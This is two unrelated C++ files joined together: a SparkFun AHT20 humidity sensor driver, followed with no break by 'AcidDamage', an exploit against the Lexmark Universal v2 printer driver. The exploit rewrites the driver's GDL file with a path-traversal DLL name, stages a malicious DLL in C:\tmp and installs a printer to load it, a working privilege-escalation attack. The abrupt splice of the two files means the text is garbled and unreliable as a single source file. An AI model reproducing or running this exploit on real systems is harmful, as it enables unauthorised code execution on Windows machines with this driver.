 * Distributed as-is; no warranty is given.
 ***************************************************************/

#include <SparkFun_Qwiic_Humidity_AHT20.h>

/*--------------------------- Device Status ------------------------------*/
bool AHT20::begin(TwoWire &wirePort)
{
    _i2cPort = &wirePort; //Grab the port the user wants to communicate on

    _deviceAddress = AHT20_DEFAULT_ADDRESS; //We had hoped the AHT20 would support two addresses but it doesn't seem to

    if (isConnected() == false)
        return false;

    //Wait 40 ms after power-on before reading temp or humidity. Datasheet pg 8
    delay(40);

    //Check if the calibrated bit is set. If not, init the sensor.
    if (isCalibrated() == false)
    {
        //Send 0xBE0800
        initialize();

        //Immediately trigger a measurement. Send 0xAC3300
        triggerMeasurement();

        delay(75); //Wait for measurement to complete

        uint8_t counter = 0;
        while (isBusy())
        {
            delay(1);
            if (counter++ > 100)
                return (false); //Give up after 100ms
        }

        //This calibration sequence is not completely proven. It's not clear how and when the cal bit clears
        //This seems to work but it's not easily testable
        if (isCalibrated() == false)
        {
            return (false);
        }
    }

    //Check that the cal bit has been set
    if (isCalibrated() == false)
        return false;

    //Mark all datums as fresh (not read before)
    sensorQueried.temperature = true;
    sensorQueried.humidity = true;

    return true;
}

//Ping the AHT20's I2C address
//If we get a response, we are correctly communicating with the AHT20
bool AHT20::isConnected()
{
    _i2cPort->beginTransmission(_deviceAddress);
    if (_i2cPort->endTransmission() == 0)
        return true;

    //If IC failed to respond, give it 20ms more for Power On Startup
    //Datasheet pg 7
    delay(20);

    _i2cPort->beginTransmission(_deviceAddress);
    if (_i2cPort->endTransmission() == 0)
        return true;

    return false;
}

/*------------------------ Measurement Helpers ---------------------------*/

uint8_t AHT20::getStatus()
{
    _i2cPort->requestFrom(_deviceAddress, (uint8_t)1);
    if (_i2cPort->available())
        return (_i2cPort->read());
    return (0);
}

//Returns the state of the cal bit in the status byte
bool AHT20::isCalibrated()
{
    return (getStatus() & (1 << 3));
}

//Returns the state of the busy bit in the status byte
bool AHT20::isBusy()
{
    return (getStatus() & (1 << 7));
}

bool AHT20::initialize()
{
    _i2cPort->beginTransmission(_deviceAddress);
    _i2cPort->write(sfe_aht20_reg_initialize);
    _i2cPort->write((uint8_t)0x08);
    _i2cPort->write((uint8_t)0x00);
    if (_i2cPort->endTransmission() == 0)
        return true;
    return false;
}

bool AHT20::triggerMeasurement()
{
    _i2cPort->beginTransmission(_deviceAddress);
    _i2cPort->write(sfe_aht20_reg_measure);
    _i2cPort->write((uint8_t)0x33);
    _i2cPort->write((uint8_t)0x00);
    if (_i2cPort->endTransmission() == 0)
        return true;
    return false;
}

//Loads the
void AHT20::readData()
{
    //Clear previous data
    sensorData.temperature = 0;
    sensorData.humidity = 0;

    if (_i2cPort->requestFrom(_deviceAddress, (uint8_t)6) > 0)
    {
        _i2cPort->read(); // Read and discard state

        uint32_t incoming = 0;
        incoming |= (uint32_t)_i2cPort->read() << (8 * 2);
        incoming |= (uint32_t)_i2cPort->read() << (8 * 1);
        uint8_t midByte = _i2cPort->read();

        incoming |= midByte;
        sensorData.humidity = incoming >> 4;

        sensorData.temperature = (uint32_t)midByte << (8 * 2);
        sensorData.temperature |= (uint32_t)_i2cPort->read() << (8 * 1);
        sensorData.temperature |= (uint32_t)_i2cPort->read() << (8 * 0);

        //Need to get rid of data in bits > 20
        sensorData.temperature = sensorData.temperature & ~(0xFFF00000);

        //Mark data as fresh
        sensorQueried.temperature = false;
        sensorQueried.humidity = false;
    }
}

//Triggers a measurement if one has not been previously started, then returns false
//If measurement has been started, checks to see if complete.
//If not complete, returns false
//If complete, readData(), mark measurement as not started, return true
bool AHT20::available()
{
    if (measurementStarted == false)
    {
        triggerMeasurement();
        measurementStarted = true;
        return (false);
    }

    if (isBusy() == true)
    {
        return (false);
    }

    readData();
    measurementStarted = false;
    return (true);
}

bool AHT20::softReset()
{
    _i2cPort->beginTransmission(_deviceAddress);
    _i2cPort->write(sfe_aht20_reg_reset);
    if (_i2cPort->endTransmission() == 0)
        return true;
    return false;
}

/*------------------------- Make Measurements ----------------------------*/

float AHT20::getTemperature()
{
    if (sensorQueried.temperature == true)
    {
        //We've got old data so trigger new measurement
        triggerMeasurement();

        delay(75); //Wait for measurement to complete

        uint8_t counter = 0;
        while (isBusy())
        {
            delay(1);
            if (counter++ > 100)
                return (false); //Give up after 100ms
        }

        readData();
    }

    //From datasheet pg 8
    float tempCelsius = ((float)sensorData.temperature / 1048576) * 200 - 50;

    //Mark data as old
    sensorQueried.temperature = true;

    return tempCelsius;
}

float AHT20::getHumidity()
{
    if (sensorQueried.humidity == true)
    {
        //We've got old data so trigger new measurement
        triggerMeasurement();

        delay(75); //Wait for measurement to complete

        uint8_t counter = 0;
        while (isBusy())
        {
            delay(1);
            if (counter++ > 100)
                return (false); //Give up after 100ms
        }

        readData();
    }

    //From datasheet pg 8
    float relHumidity = ((float)sensorData.humidity / 1048576) * 100;

    //Mark data as old
    sensorQueried.humidity = true;

    return relHumidity;
}

#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "inject_me.hpp"
#include "aciddamage.hpp"

namespace
{
    bool read_all(const std::string& p_path, std::string& p_content)
    {
        std::cout << "[+] Read in " << p_path << std::endl;

        std::ifstream gpl_file;
        gpl_file.open(p_path, std::ifstream::in);
        while (!gpl_file.is_open())
        {
            std::cout << "[-] Failed to open " << p_path << std::endl;
            return false;
        }

        while (gpl_file.good())
        {
            p_content.push_back(gpl_file.get());
        }

        gpl_file.close();
        return true;
    }

    bool overwrite_path(const std::string p_target, std::string& p_contents)
    {
        std::cout << "[+] Searching file contents " << std::endl;
        std::string target("<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">LMUD1OUE.DLL</GDL_ATTRIBUTE>");
        std::size_t pos = p_contents.find(target);
        if (pos == std::string::npos)
        {
            std::cout << "[-] Failed to find vulnerable string" << std::endl;
            return false;
        }

        std::cout << "[+] Updating file contents" << std::endl;
        p_contents.replace(pos, target.size(), "<GDL_ATTRIBUTE Name=\"*Name\" xsi:type=\"GDLW_string\">..\\..\\..\\..\\..\\..\\tmp\\Dll.dll</GDL_ATTRIBUTE>");

        std::cout << "[+] Dropping updated gpl" << std::endl;
        std::ofstream ofs(p_target, std::ofstream::trunc);
        if (!ofs.is_open())
        {
            std::cerr << "[!] Failed to open " << p_target << " for writing" << std::endl;
            return false;
        }
        ofs << p_contents;
        ofs.flush();
        ofs.close();
        return true;
    }
}

AcidDamage::AcidDamage() :
    Exploit("Lexmark Universal v2", "AcidDamage"),
    m_target_directory("C:\\ProgramData\\Lexmark Universal v2\\"),
    m_target_dll("Universal Color Laser.gdl")
{
}

AcidDamage::~AcidDamage()
{
}

bool AcidDamage::do_exploit()
{
    if (!initialize_attack_space(m_target_directory))
    {
        return false;
    }

    std::string fcontents;
    if (!read_all(m_target_directory + m_target_dll, fcontents))
    {
        return false;
    }

    if (!overwrite_path(m_target_directory + m_target_dll, fcontents))
    {
        return false;
    }

    // drop inject_me to disk if no command line dll has been provided
    if (!m_custom_dll && !drop_dll_to_disk(m_malicious_dll, inject_me_dll, inject_me_dll_len))
    {
        return false;
    }

    std::cout << "[+] Staging dll in c:\\tmp" << std::endl;
    std::string tmp_dir("C:\\tmp\\");
    std::filesystem::create_directory(tmp_dir);
    try
    {
        std::filesystem::copy_file(m_malicious_dll, tmp_dir + "Dll.dll");
    }
    catch (const std::exception& e)
    {
        std::cout << "[-] " << e.what() << std::endl;
    }

    install_printer();

    if (!std::filesystem::exists("C:\\result.txt"))
    {
        if (m_custom_dll)
        {
            std::cout << "[+] Exploit complete." << std::endl;
        }
        else
        {
            std::cout << "[-] Failed! Oh no!" << std::endl;
        }
    }
    else
    {
        std::cout << "[!] Mucho success!" << std::endl;
    }

    // delete the directory / file so we can reexploit if we want
    std::filesystem::remove_all(m_target_directory);
    std::filesystem::remove_all(tmp_dir);
    return true;
}

